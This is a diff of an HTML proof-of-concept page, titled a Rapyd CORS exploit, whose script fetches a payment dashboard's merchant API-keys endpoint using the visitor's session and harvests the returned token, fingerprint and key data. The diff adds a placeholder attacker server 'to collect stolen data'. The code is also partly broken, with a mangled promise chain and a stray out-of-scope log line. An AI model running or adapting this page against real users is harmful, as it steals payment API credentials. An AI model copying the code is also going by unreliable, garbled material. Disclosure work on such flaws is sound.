@@ -2,12 +2,12 @@
 <html>
   <body>
     <h2>💣 Rapyd CORS Exploit PoC</h2>
-    
     <script>
-      // Target endpoint that returns sensitive data
+     // Target endpoint that returns sensitive data
         const targetUrl = 'https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys';
         
-
+        // Your server to collect stolen data
+        const attackerServer = 'https://your-domain.com/collect';
         
         // Make the malicious request
         fetch(targetUrl, {
@@ -27,7 +27,14 @@
             const token = response.headers.get('token');
             const fingerprint = response.headers.get('fingerprint');
             
-            console.log(token)
+            // Get response data
+            return response.json().then(data => ({
+                token,
+                fingerprint,
+                data
+            }));
+        })
+      console.log(token)
     </script>
   </body>
 </html>
